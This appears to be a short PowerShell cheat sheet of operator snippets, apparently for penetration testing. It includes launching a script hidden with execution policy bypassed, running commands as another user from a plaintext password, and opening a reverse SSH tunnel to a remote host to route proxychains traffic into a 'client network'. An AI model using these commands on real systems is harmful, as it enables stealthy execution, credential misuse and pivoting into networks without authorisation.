### Start and creates a new process (detached)
```
Start-Process -wi 1 -FilePath "cmd" -ArgumentList "/c type &lt;powershellScript&gt; | powershell -WindowStyle Hidden -exec bypass"
```

### Start process as another user (-wi 1 to minimize window pop up)
```
$scp = ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('&lt;domain&gt;\&lt;user&gt;', $scp); start-process -wi 1 -FilePath "cmd.exe" -ArgumentList "/c &lt;command&gt;" -Credential $cred
```

### Forward proxychains traffic into client network
```
Start-Process -wi 1 -FilePath "powershell" -ArgumentList " -c ssh -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\&lt;privateKey&gt; -N -R 9050 &lt;user&gt;@&lt;rhost&gt;"
```

### Search for process by name
```
Get-Process | Where-Object { $_.ProcessName -like "*&lt;name&gt;*" } | Select-Object ProcessName, Id
```

### Stop process by name
```
Stop-Process -Name "&lt;name&gt;"
```


